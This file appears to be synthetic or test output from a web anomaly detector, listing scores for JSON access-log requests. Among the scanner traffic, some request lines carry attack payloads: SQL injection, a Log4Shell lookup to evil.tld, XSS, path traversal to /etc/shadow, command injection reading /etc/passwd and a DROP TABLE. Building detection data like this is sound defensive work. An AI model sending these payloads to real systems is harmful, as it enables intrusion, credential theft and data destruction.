score_content,score_session,score_fused,line
75.88275909423828,,75.88275909423828,{"remote_addr": "46.194.230.110", "time_local": "11/Jan/2025:09:01:50 -0700", "request": "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 4887, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
76.0433120727539,,76.0433120727539,{"remote_addr": "39.2.16.176", "time_local": "11/Jan/2025:09:01:51 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 6976, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
2.3508219718933105,,2.3508219718933105,{"remote_addr": "231.189.216.167", "time_local": "11/Jan/2025:09:01:52 -0700", "request": "GET /assets/app.js HTTP/2", "status": 304, "body_bytes_sent": 11903, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
30.996320724487305,,30.996320724487305,{"remote_addr": "207.136.133.188", "time_local": "11/Jan/2025:09:01:53 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16819, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.862075924873352,,1.862075924873352,{"remote_addr": "146.182.77.167", "time_local": "11/Jan/2025:09:01:53 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 2196, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
76.04463195800781,,76.04463195800781,{"remote_addr": "214.105.192.222", "time_local": "11/Jan/2025:09:01:54 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 13795, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.410925388336182,,4.410925388336182,{"remote_addr": "146.58.16.139", "time_local": "11/Jan/2025:09:01:55 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 8275, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.7025470733642578,,1.7025470733642578,{"remote_addr": "44.88.170.126", "time_local": "11/Jan/2025:09:01:56 -0700", "request": "GET /login HTTP/2", "status": 200, "body_bytes_sent": 9927, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
45.0369987487793,,45.0369987487793,{"remote_addr": "237.141.5.209", "time_local": "11/Jan/2025:09:01:56 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 11037, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
1.7096283435821533,,1.7096283435821533,{"remote_addr": "87.8.253.20", "time_local": "11/Jan/2025:09:01:57 -0700", "request": "GET /login HTTP/2", "status": 200, "body_bytes_sent": 12110, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
31.082042694091797,,31.082042694091797,{"remote_addr": "167.121.52.152", "time_local": "11/Jan/2025:09:01:58 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 17439, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
0.28884580731391907,,0.28884580731391907,{"remote_addr": "120.48.249.38", "time_local": "11/Jan/2025:09:01:59 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 17442, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
16.91395378112793,,16.91395378112793,{"remote_addr": "119.149.174.112", "time_local": "11/Jan/2025:09:02:00 -0700", "request": "PUT /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 7297, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
8.541860580444336,,8.541860580444336,{"remote_addr": "236.224.251.54", "time_local": "11/Jan/2025:09:02:01 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7714, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
102.90591430664062,,102.90591430664062,{"remote_addr": "98.159.247.224", "time_local": "11/Jan/2025:09:02:01 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 6190, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
6.452455520629883,,6.452455520629883,{"remote_addr": "94.187.2.181", "time_local": "11/Jan/2025:09:02:02 -0700", "request": "POST /contact HTTP/2", "status": 304, "body_bytes_sent": 17150, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
48.56964111328125,,48.56964111328125,{"remote_addr": "68.54.200.73", "time_local": "11/Jan/2025:09:02:03 -0700", "request": "HEAD /logout HTTP/2", "status": 304, "body_bytes_sent": 8366, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
11.408154487609863,,11.408154487609863,{"remote_addr": "247.209.136.81", "time_local": "11/Jan/2025:09:02:03 -0700", "request": "PUT /index.html HTTP/2", "status": 200, "body_bytes_sent": 3654, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
46.422794342041016,,46.422794342041016,{"remote_addr": "99.162.66.26", "time_local": "11/Jan/2025:09:02:04 -0700", "request": "HEAD /dashboard HTTP/2", "status": 200, "body_bytes_sent": 15573, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
4.412627696990967,,4.412627696990967,{"remote_addr": "59.120.59.209", "time_local": "11/Jan/2025:09:02:04 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 8762, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
30.962926864624023,,30.962926864624023,{"remote_addr": "199.52.38.3", "time_local": "11/Jan/2025:09:02:05 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 12247, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
50.741004943847656,,50.741004943847656,{"remote_addr": "212.113.107.116", "time_local": "11/Jan/2025:09:02:06 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 4192, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.5163009762763977,,0.5163009762763977,{"remote_addr": "46.125.92.133", "time_local": "11/Jan/2025:09:02:07 -0700", "request": "GET /.env HTTP/2", "status": 201, "body_bytes_sent": 8623, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
5.844900131225586,,5.844900131225586,{"remote_addr": "127.35.170.85", "time_local": "11/Jan/2025:09:02:08 -0700", "request": "GET /search?q=camera HTTP/2", "status": 204, "body_bytes_sent": 16126, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
10.606095314025879,,10.606095314025879,{"remote_addr": "204.239.16.15", "time_local": "11/Jan/2025:09:02:08 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 3315, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
16.919593811035156,,16.919593811035156,{"remote_addr": "188.63.211.227", "time_local": "11/Jan/2025:09:02:09 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 5055, "http_referer": "-", "http_user_agent": "dirb/2.22"}
86.98615264892578,,86.98615264892578,{"remote_addr": "105.193.195.149", "time_local": "11/Jan/2025:09:02:09 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 400, "body_bytes_sent": 886, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.5629206895828247,,1.5629206895828247,{"remote_addr": "168.202.249.122", "time_local": "11/Jan/2025:09:02:10 -0700", "request": "GET /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 13042, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
102.87195587158203,,102.87195587158203,{"remote_addr": "54.121.139.185", "time_local": "11/Jan/2025:09:02:11 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 15511, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
46.357635498046875,,46.357635498046875,{"remote_addr": "243.128.152.12", "time_local": "11/Jan/2025:09:02:11 -0700", "request": "HEAD /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 3921, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
102.855712890625,,102.855712890625,{"remote_addr": "139.112.26.219", "time_local": "11/Jan/2025:09:02:12 -0700", "request": "TRACE /profile HTTP/2", "status": 200, "body_bytes_sent": 10147, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
70.52468872070312,,70.52468872070312,{"remote_addr": "225.128.177.215", "time_local": "11/Jan/2025:09:02:12 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 200, "body_bytes_sent": 8022, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
16.919692993164062,,16.919692993164062,{"remote_addr": "197.204.162.38", "time_local": "11/Jan/2025:09:02:13 -0700", "request": "PUT /search?q=phone HTTP/2", "status": 204, "body_bytes_sent": 5809, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
16.94696807861328,,16.94696807861328,{"remote_addr": "20.122.182.168", "time_local": "11/Jan/2025:09:02:13 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 204, "body_bytes_sent": 16228, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
37.70985412597656,,37.70985412597656,{"remote_addr": "182.45.202.185", "time_local": "11/Jan/2025:09:02:14 -0700", "request": "DELETE /api/products HTTP/2", "status": 401, "body_bytes_sent": 597, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
102.89392852783203,,102.89392852783203,{"remote_addr": "96.25.104.161", "time_local": "11/Jan/2025:09:02:15 -0700", "request": "TRACE /logout HTTP/2", "status": 200, "body_bytes_sent": 12321, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.400889873504639,,4.400889873504639,{"remote_addr": "119.219.147.138", "time_local": "11/Jan/2025:09:02:16 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 5490, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.05360221862793,,24.05360221862793,{"remote_addr": "78.133.152.155", "time_local": "11/Jan/2025:09:02:16 -0700", "request": "PUT / HTTP/2", "status": 404, "body_bytes_sent": 877, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
45.12797546386719,,45.12797546386719,{"remote_addr": "186.163.11.66", "time_local": "11/Jan/2025:09:02:17 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 13348, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
101.55493927001953,,101.55493927001953,{"remote_addr": "120.109.50.112", "time_local": "11/Jan/2025:09:02:18 -0700", "request": "TRACE /index.html HTTP/2", "status": 200, "body_bytes_sent": 9068, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
3.6835107803344727,,3.6835107803344727,{"remote_addr": "235.188.77.245", "time_local": "11/Jan/2025:09:02:18 -0700", "request": "GET /profile HTTP/2", "status": 301, "body_bytes_sent": 10393, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
46.4401741027832,,46.4401741027832,{"remote_addr": "179.64.186.7", "time_local": "11/Jan/2025:09:02:19 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 2395, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.22929243743419647,,0.22929243743419647,{"remote_addr": "82.74.172.21", "time_local": "11/Jan/2025:09:02:19 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 5543, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.4786896705627441,,1.4786896705627441,{"remote_addr": "205.126.90.190", "time_local": "11/Jan/2025:09:02:20 -0700", "request": "GET /server-status HTTP/2", "status": 200, "body_bytes_sent": 9608, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
48.47054672241211,,48.47054672241211,{"remote_addr": "63.192.113.149", "time_local": "11/Jan/2025:09:02:21 -0700", "request": "HEAD /dashboard HTTP/2", "status": 302, "body_bytes_sent": 12399, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.22131070494651794,,0.22131070494651794,{"remote_addr": "238.29.96.92", "time_local": "11/Jan/2025:09:02:22 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 1743, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
12.771646499633789,,12.771646499633789,{"remote_addr": "30.30.1.103", "time_local": "11/Jan/2025:09:02:22 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 4263, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
46.44620132446289,,46.44620132446289,{"remote_addr": "190.148.252.154", "time_local": "11/Jan/2025:09:02:23 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 4820, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
76.01058959960938,,76.01058959960938,{"remote_addr": "79.100.12.205", "time_local": "11/Jan/2025:09:02:23 -0700", "request": "OPTIONS /search?q=router HTTP/2", "status": 204, "body_bytes_sent": 9574, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
46.39004135131836,,46.39004135131836,{"remote_addr": "9.156.203.140", "time_local": "11/Jan/2025:09:02:24 -0700", "request": "HEAD /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 13620, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
572.044189453125,,572.044189453125,{"remote_addr": "37.114.55.228", "time_local": "11/Jan/2025:09:02:24 -0700", "request": "POST /api/products HTTP/2", "status": 500, "body_bytes_sent": 1019, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
107.15512084960938,,107.15512084960938,{"remote_addr": "24.168.60.45", "time_local": "11/Jan/2025:09:02:25 -0700", "request": "TRACE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 10918, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
107.0304183959961,,107.0304183959961,{"remote_addr": "99.66.73.250", "time_local": "11/Jan/2025:09:02:26 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5551, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
75.99553680419922,,75.99553680419922,{"remote_addr": "166.218.117.180", "time_local": "11/Jan/2025:09:02:27 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8042, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
71.73271179199219,,71.73271179199219,{"remote_addr": "8.2.217.85", "time_local": "11/Jan/2025:09:02:28 -0700", "request": "OPTIONS /api/products HTTP/2", "status": 200, "body_bytes_sent": 2573, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
26.804529190063477,,26.804529190063477,{"remote_addr": "76.253.83.134", "time_local": "11/Jan/2025:09:02:28 -0700", "request": "DELETE /logout HTTP/2", "status": 200, "body_bytes_sent": 13019, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
8.53054428100586,,8.53054428100586,{"remote_addr": "95.156.170.54", "time_local": "11/Jan/2025:09:02:28 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 1144, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
11.339950561523438,,11.339950561523438,{"remote_addr": "43.180.206.78", "time_local": "11/Jan/2025:09:02:29 -0700", "request": "GET /assets/app.js HTTP/2", "status": 404, "body_bytes_sent": 1330, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.6378083229064941,,1.6378083229064941,{"remote_addr": "204.15.162.39", "time_local": "11/Jan/2025:09:02:29 -0700", "request": "GET /contact HTTP/2", "status": 200, "body_bytes_sent": 9699, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
12.745412826538086,,12.745412826538086,{"remote_addr": "82.122.219.183", "time_local": "11/Jan/2025:09:02:30 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 15885, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
3.219794988632202,,3.219794988632202,{"remote_addr": "116.205.80.168", "time_local": "11/Jan/2025:09:02:31 -0700", "request": "POST /.env HTTP/2", "status": 200, "body_bytes_sent": 1118, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
104.93293762207031,,104.93293762207031,{"remote_addr": "50.53.75.50", "time_local": "11/Jan/2025:09:02:32 -0700", "request": "TRACE /logout HTTP/2", "status": 301, "body_bytes_sent": 10746, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
76.09164428710938,,76.09164428710938,{"remote_addr": "31.31.236.208", "time_local": "11/Jan/2025:09:02:33 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 11727, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
4.204379558563232,,4.204379558563232,{"remote_addr": "101.169.184.209", "time_local": "11/Jan/2025:09:02:33 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 13194, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
102.6764144897461,,102.6764144897461,{"remote_addr": "218.196.134.245", "time_local": "11/Jan/2025:09:02:34 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 1262, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
3.618252754211426,,3.618252754211426,{"remote_addr": "177.9.238.231", "time_local": "11/Jan/2025:09:02:35 -0700", "request": "GET /api/products HTTP/2", "status": 301, "body_bytes_sent": 11660, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
1.9055832624435425,,1.9055832624435425,{"remote_addr": "62.235.103.70", "time_local": "11/Jan/2025:09:02:36 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 16188, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
8.516145706176758,,8.516145706176758,{"remote_addr": "122.196.51.100", "time_local": "11/Jan/2025:09:02:36 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 875, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
48.582759857177734,,48.582759857177734,{"remote_addr": "25.159.2.37", "time_local": "11/Jan/2025:09:02:37 -0700", "request": "HEAD /login HTTP/2", "status": 301, "body_bytes_sent": 12676, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.2730880379676819,,0.2730880379676819,{"remote_addr": "4.96.158.84", "time_local": "11/Jan/2025:09:02:39 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 266, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
30.962568283081055,,30.962568283081055,{"remote_addr": "179.237.107.79", "time_local": "11/Jan/2025:09:02:39 -0700", "request": "DELETE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 12131, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.3484652042388916,,2.3484652042388916,{"remote_addr": "102.250.69.124", "time_local": "11/Jan/2025:09:02:40 -0700", "request": "GET /.git/config HTTP/2", "status": 302, "body_bytes_sent": 4023, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
28.069053649902344,,28.069053649902344,{"remote_addr": "220.49.155.98", "time_local": "11/Jan/2025:09:02:40 -0700", "request": "PUT /search?q=ssd HTTP/2", "status": 404, "body_bytes_sent": 710, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.37326717376709,,4.37326717376709,{"remote_addr": "210.158.155.13", "time_local": "11/Jan/2025:09:02:41 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 16777, "http_referer": "-", "http_user_agent": "dirb/2.22"}
28.7651309967041,,28.7651309967041,{"remote_addr": "55.13.125.90", "time_local": "11/Jan/2025:09:02:42 -0700", "request": "DELETE /dashboard HTTP/2", "status": 304, "body_bytes_sent": 3220, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
3.0385358333587646,,3.0385358333587646,{"remote_addr": "191.43.194.170", "time_local": "11/Jan/2025:09:02:43 -0700", "request": "POST /index.html HTTP/2", "status": 200, "body_bytes_sent": 5409, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
8.633553504943848,,8.633553504943848,{"remote_addr": "31.67.246.156", "time_local": "11/Jan/2025:09:02:44 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 201, "body_bytes_sent": 17114, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
27.973413467407227,,27.973413467407227,{"remote_addr": "56.19.61.14", "time_local": "11/Jan/2025:09:02:45 -0700", "request": "PUT /search?q=monitor HTTP/2", "status": 404, "body_bytes_sent": 1275, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30.903905868530273,,30.903905868530273,{"remote_addr": "60.100.221.193", "time_local": "11/Jan/2025:09:02:45 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 16866, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
16.917478561401367,,16.917478561401367,{"remote_addr": "2.202.77.254", "time_local": "11/Jan/2025:09:02:46 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 4448, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
8.549920082092285,,8.549920082092285,{"remote_addr": "72.9.66.15", "time_local": "11/Jan/2025:09:02:46 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 16433, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
5.855268478393555,,5.855268478393555,{"remote_addr": "64.143.224.98", "time_local": "11/Jan/2025:09:02:47 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 16599, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
26.814239501953125,,26.814239501953125,{"remote_addr": "149.35.86.13", "time_local": "11/Jan/2025:09:02:48 -0700", "request": "DELETE /login HTTP/2", "status": 200, "body_bytes_sent": 904, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
76.03468322753906,,76.03468322753906,{"remote_addr": "82.222.75.57", "time_local": "11/Jan/2025:09:02:48 -0700", "request": "OPTIONS /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 511, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
107.02621459960938,,107.02621459960938,{"remote_addr": "117.132.125.160", "time_local": "11/Jan/2025:09:02:49 -0700", "request": "TRACE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 4246, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
12.739302635192871,,12.739302635192871,{"remote_addr": "22.170.247.103", "time_local": "11/Jan/2025:09:02:49 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 13732, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.34523868560791,,4.34523868560791,{"remote_addr": "177.101.114.4", "time_local": "11/Jan/2025:09:02:49 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 7776, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
0.18835072219371796,,0.18835072219371796,{"remote_addr": "200.211.6.42", "time_local": "11/Jan/2025:09:02:50 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 1044, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
30.88653564453125,,30.88653564453125,{"remote_addr": "33.209.154.197", "time_local": "11/Jan/2025:09:02:50 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 9433, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
25.348743438720703,,25.348743438720703,{"remote_addr": "67.53.52.56", "time_local": "11/Jan/2025:09:02:51 -0700", "request": "DELETE /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 15270, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
3.7018508911132812,,3.7018508911132812,{"remote_addr": "79.167.137.43", "time_local": "11/Jan/2025:09:02:51 -0700", "request": "GET /contact HTTP/2", "status": 304, "body_bytes_sent": 6044, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
8.527597427368164,,8.527597427368164,{"remote_addr": "134.171.73.167", "time_local": "11/Jan/2025:09:02:52 -0700", "request": "POST /search?q=router HTTP/2", "status": 201, "body_bytes_sent": 4440, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
26.80022621154785,,26.80022621154785,{"remote_addr": "15.108.108.160", "time_local": "11/Jan/2025:09:02:52 -0700", "request": "DELETE /logout HTTP/2", "status": 201, "body_bytes_sent": 12415, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
26.84965705871582,,26.84965705871582,{"remote_addr": "22.203.144.108", "time_local": "11/Jan/2025:09:02:53 -0700", "request": "DELETE /about HTTP/2", "status": 200, "body_bytes_sent": 17457, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
4.390085220336914,,4.390085220336914,{"remote_addr": "218.212.38.11", "time_local": "11/Jan/2025:09:02:53 -0700", "request": "POST /about HTTP/2", "status": 201, "body_bytes_sent": 2680, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
